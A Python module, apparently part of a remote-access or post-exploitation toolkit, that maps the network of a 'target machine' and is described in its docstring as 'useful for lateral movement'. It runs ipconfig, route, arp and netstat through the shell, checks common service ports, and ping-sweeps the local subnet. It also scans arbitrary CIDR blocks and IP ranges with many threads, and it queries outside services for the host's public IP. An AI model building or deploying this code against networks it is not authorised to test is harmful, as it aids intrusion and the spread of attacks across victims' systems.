################################################
# Network Discovery Feature Module             #
# Discovers network information and hosts      #
################################################

import socket
import subprocess
import platform
import os
import ipaddress
import time
import concurrent.futures


class NetworkDiscovery:
    """
    Discovers network information, IP addresses, and connected hosts.
    Useful for lateral movement and understanding network topology.
    """
    
    def __init__(self):
        """Initialize network discovery module"""
        # Current operating system
        self.system = platform.system()
        # System hostname
        self.hostname = socket.gethostname()
        # Local IP address of target machine
        self.local_ip = None
        # Get local IP on initialization
        self.get_local_ip()
    
    def get_local_ip(self):
        """
        Get the local IP address of target machine
        
        Uses a dummy connection to determine the primary network interface IP.
        
        Returns:
            Local IP address as string
        """
        try:
            # Create a socket to determine local IP
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            # Connect to public DNS (doesn't actually send data)
            s.connect(("8.8.8.8", 80))
            # Get the local IP from this socket connection
            self.local_ip = s.getsockname()[0]
            s.close()
            return self.local_ip
        except:
            # Fallback to localhost if unable to determine
            self.local_ip = "127.0.0.1"
            return self.local_ip
    
    def get_network_info(self):
        """Get comprehensive network information"""
        info = {
            'hostname': self.hostname,
            'local_ip': self.local_ip,
            'system': self.system,
        }
        
        # Get network interfaces
        try:
            if self.system == 'Windows':
                result = subprocess.check_output('ipconfig /all', shell=True).decode()
            else:
                result = subprocess.check_output('ifconfig 2>/dev/null || ip addr', shell=True).decode()
            info['interfaces'] = result[:2000]  # Limit output
        except:
            info['interfaces'] = "Unable to retrieve interface information"
        
        # Get routing table
        try:
            if self.system == 'Windows':
                result = subprocess.check_output('route print', shell=True).decode()
            else:
                result = subprocess.check_output('netstat -rn 2>/dev/null || ip route', shell=True).decode()
            info['routing'] = result[:2000]
        except:
            info['routing'] = "Unable to retrieve routing information"
        
        # Get ARP cache
        try:
            if self.system == 'Windows':
                result = subprocess.check_output('arp -a', shell=True).decode()
            else:
                result = subprocess.check_output('arp -a 2>/dev/null || ip neigh', shell=True).decode()
            info['arp_cache'] = result
        except:
            info['arp_cache'] = "Unable to retrieve ARP cache"
        
        return info
    
    def get_active_connections(self):
        """Get active network connections"""
        try:
            if self.system == 'Windows':
                result = subprocess.check_output('netstat -ano', shell=True).decode()
            else:
                result = subprocess.check_output('netstat -tupan 2>/dev/null || ss -tupan', shell=True).decode()
            return result[:3000]  # Limit output
        except:
            return "Unable to retrieve active connections"
    
    def scan_port(self, host, port, timeout=1):
        """
        Scan a single port on a host
        
        Args:
            host: IP address or hostname to scan
            port: Port number to check
            timeout: Connection timeout in seconds
            
        Returns:
            True if port is open, False otherwise
        """
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(timeout)
            # Try to connect to port (returns 0 if successful)
            result = sock.connect_ex((host, port))
            sock.close()
            return result == 0
        except:
            return False
    
    def scan_common_ports(self, host):
        """
        Scan common ports on a host
        
        Checks well-known service ports like HTTP, SSH, RDP, etc.
        
        Args:
            host: IP address or hostname to scan
            
        Returns:
            List of open ports or error message
        """
        # Common service ports to scan
        common_ports = [21, 22, 23, 25, 80, 443, 445, 3306, 3389, 5432, 8080, 8443]
        open_ports = []
        
        for port in common_ports:
            if self.scan_port(host, port):
                open_ports.append(port)
        
        return open_ports if open_ports else "No common ports open"
    
    def discover_local_network(self):
        """
        Discover hosts on the local network.
        Uses simple ping sweep.
        """
        try:
            # Get network range
            local_ip = self.local_ip
            network = '.'.join(local_ip.split('.')[:-1]) + '.0/24'
            
            active_hosts = []
            active_hosts.append(f"Scanning network: {network}")
            active_hosts.append("This may take a moment...\n")
            
            # Ping sweep (simplified for performance)
            base_ip = '.'.join(local_ip.split('.')[:-1])
            
            for i in range(1, 255):
                host = f"{base_ip}.{i}"
                
                # Ping command varies by OS
                if self.system == 'Windows':
                    ping_cmd = f'ping -n 1 -w 100 {host}'
                else:
                    ping_cmd = f'ping -c 1 -W 1 {host}'
                
                try:
                    result = subprocess.call(
                        ping_cmd,
                        shell=True,
                        stdout=subprocess.DEVNULL,
                        stderr=subprocess.DEVNULL,
                        timeout=2
                    )
                    if result == 0:
                        active_hosts.append(f"[+] Host alive: {host}")
                except:
                    continue
                
                # Limit to first 10 hosts for performance
                if len(active_hosts) > 12:
                    active_hosts.append("\n[Note: Scan limited to first 10 hosts for performance]")
                    break
            
            return '\n'.join(active_hosts) if len(active_hosts) > 2 else "No active hosts found"
        
        except Exception as e:
            return f"Error discovering network: {str(e)}"

    def _ping_host(self, host, timeout=1):
        """Ping a single host (cross-platform). Returns True if host responds."""
        try:
            if self.system == 'Windows':
                ping_cmd = f'ping -n 1 -w {int(timeout*1000)} {host}'
            else:
                # Use -c 1 (count 1) and -W for timeout in seconds (Linux) or -t on BSD
                ping_cmd = f'ping -c 1 -W {int(timeout)} {host}'

            result = subprocess.call(
                ping_cmd,
                shell=True,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                timeout=timeout + 1
            )
            return result == 0
        except:
            return False

    def scan_cidr(self, cidr, ping=True, ports=None, max_hosts=None, concurrency=100, timeout=1):
        """Scan a CIDR network (e.g., '192.168.1.0/24').

        Options:
        - ping: use ICMP ping to detect live hosts (may require privileges).
        - ports: list of ports to check instead of ICMP (uses TCP connect).
        - max_hosts: limit number of hosts scanned (for performance/testing).
        - concurrency: number of worker threads.
        - timeout: connect/ping timeout in seconds.

        Returns a list of alive hosts and optionally open ports.
        """
        try:
            network = ipaddress.ip_network(cidr, strict=False)
        except Exception as e:
            return f"Invalid CIDR: {cidr} ({e})"

        hosts = [str(h) for h in network.hosts()]
        if max_hosts:
            hosts = hosts[:max_hosts]

        results = []

        def _check(host):
            entry = {'host': host}
            alive = False
            if ping:
                alive = self._ping_host(host, timeout=timeout)
            elif ports:
                # Check if any port is open
                for p in ports:
                    if self.scan_port(host, p, timeout=timeout):
                        entry.setdefault('open_ports', []).append(p)
                        alive = True
            else:
                # Default fallback: try port 80
                alive = self.scan_port(host, 80, timeout=timeout)

            entry['alive'] = alive
            return entry

        with concurrent.futures.ThreadPoolExecutor(max_workers=concurrency) as ex:
            futures = {ex.submit(_check, h): h for h in hosts}
            for fut in concurrent.futures.as_completed(futures):
                try:
                    res = fut.result()
                    if res.get('alive'):
                        results.append(res)
                except Exception:
                    continue

        if not results:
            return "No active hosts found in specified CIDR"

        # Format results
        out = [f"Scanning CIDR: {cidr} (checked {len(hosts)} hosts)"]
        for r in results:
            line = f"[+] Host alive: {r['host']}"
            if 'open_ports' in r:
                line += f" | open_ports: {r['open_ports']}"
            out.append(line)

        return '\n'.join(out)

    def scan_range(self, start_ip, end_ip, **kwargs):
        """Scan an IP range from start_ip to end_ip (inclusive). Additional kwargs passed to scan_cidr-like behavior."""
        try:
            start = ipaddress.ip_address(start_ip)
            end = ipaddress.ip_address(end_ip)
        except Exception as e:
            return f"Invalid IP address: {e}"

        if start > end:
            return "Start IP must be <= End IP"

        hosts = []
        cur = start
        while cur <= end:
            hosts.append(str(cur))
            cur += 1

        max_hosts = kwargs.pop('max_hosts', None)
        if max_hosts:
            hosts = hosts[:max_hosts]

        results = []

        def _check(host):
            alive = False
            timeout = kwargs.get('timeout', 1)
            if kwargs.get('ping', True):
                alive = self._ping_host(host, timeout=timeout)
            elif kwargs.get('ports'):
                for p in kwargs.get('ports'):
                    if self.scan_port(host, p, timeout=timeout):
                        return {'host': host, 'alive': True, 'open_ports': [p]}
            else:
                alive = self.scan_port(host, 80, timeout=timeout)
            return {'host': host, 'alive': alive}

        concurrency = kwargs.get('concurrency', 100)
        with concurrent.futures.ThreadPoolExecutor(max_workers=concurrency) as ex:
            futures = {ex.submit(_check, h): h for h in hosts}
            for fut in concurrent.futures.as_completed(futures):
                try:
                    res = fut.result()
                    if res.get('alive'):
                        results.append(res)
                except Exception:
                    continue

        if not results:
            return "No active hosts found in specified range"

        out = [f"Scanning range: {start_ip} - {end_ip} (checked {len(hosts)} hosts)"]
        for r in results:
            line = f"[+] Host alive: {r['host']}"
            if 'open_ports' in r:
                line += f" | open_ports: {r['open_ports']}"
            out.append(line)

        return '\n'.join(out)
    
    def get_dns_info(self):
        """Get DNS information"""
        try:
            if self.system == 'Windows':
                result = subprocess.check_output('nslookup google.com', shell=True).decode()
            else:
                result = subprocess.check_output('cat /etc/resolv.conf 2>/dev/null', shell=True).decode()
            return result
        except:
            return "Unable to retrieve DNS information"
    
    def check_internet_connectivity(self):
        """Check if the target has internet connectivity"""
        test_hosts = ['8.8.8.8', '1.1.1.1', 'google.com']
        results = []
        
        for host in test_hosts:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(2)
                result = sock.connect_ex((host, 80))
                sock.close()
                
                if result == 0:
                    results.append(f"[+] Can reach {host}")
                else:
                    results.append(f"[-] Cannot reach {host}")
            except:
                results.append(f"[-] Cannot reach {host}")
        
        return '\n'.join(results)
    
    def get_public_ip(self):
        """Attempt to get the public IP address"""
        try:
            # Try multiple services
            services = [
                'curl -s ifconfig.me',
                'curl -s icanhazip.com',
                'curl -s ipinfo.io/ip',
            ]
            
            for service in services:
                try:
                    if self.system == 'Windows':
                        # Use PowerShell on Windows
                        service = service.replace('curl', 'curl.exe')
                    
                    result = subprocess.check_output(service, shell=True, timeout=5).decode().strip()
                    if result and len(result) < 50:  # Sanity check
                        return f"Public IP: {result}"
                except:
                    continue
            
            return "Unable to determine public IP"
        except:
            return "Unable to determine public IP"
